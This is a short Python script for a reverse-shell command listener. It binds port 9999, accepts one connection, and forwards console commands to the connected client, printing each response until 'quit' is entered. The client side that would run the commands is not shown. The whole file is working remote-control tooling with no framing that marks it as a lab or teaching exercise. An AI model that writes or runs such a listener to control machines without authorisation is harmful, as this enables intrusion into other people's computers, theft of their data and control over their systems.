import socket
import sys

def create_socket():
    global host
    global port
    global s
    host = ""
    port = 9999
    try:
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

#Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port: " + str(port))
        s.bind((host,port))
        print("Listening...")
        s.listen(5)

    except socket.error as msg:
        print("Socket binding error " + str(msg) + "\n" + "Retrying...")
        bind_socket()

# Establish a connection with a client (Socket must be listening)
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established. " + "IP" + address[0] + "Port" + str(address[1]))
    send_commands(conn)
    conn.close()

#S Send commands to client
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end = "")

def main():
    create_socket()
    print("Main-create_socket success")
    bind_socket()
    print("Main-bind_socket success")
    socket_accept()

main()
